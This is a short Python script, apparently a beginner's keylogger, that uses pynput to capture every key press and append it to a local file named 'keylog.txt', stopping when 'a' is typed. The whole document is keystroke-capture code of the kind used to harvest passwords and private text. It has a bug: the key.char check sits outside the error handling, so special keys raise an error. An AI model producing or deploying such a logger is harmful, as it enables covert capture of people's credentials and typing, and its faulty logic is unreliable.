from pynput.keyboard import Key, Listener

# Function to write the pressed key to a log file
def on_press(key):
    if(key.char=='a'):
        exit()

    
    try:
        # Open the log file in append mode
        with open("keylog.txt", "a") as f:
            # Write the pressed key to the log file
            f.write(str(key) + "\n")
    except Exception as e:
        print("Error:", e)

# Create a listener to monitor key presses
with Listener(on_press=on_press) as listener:
    # Start listening for key presses
    listener.join()
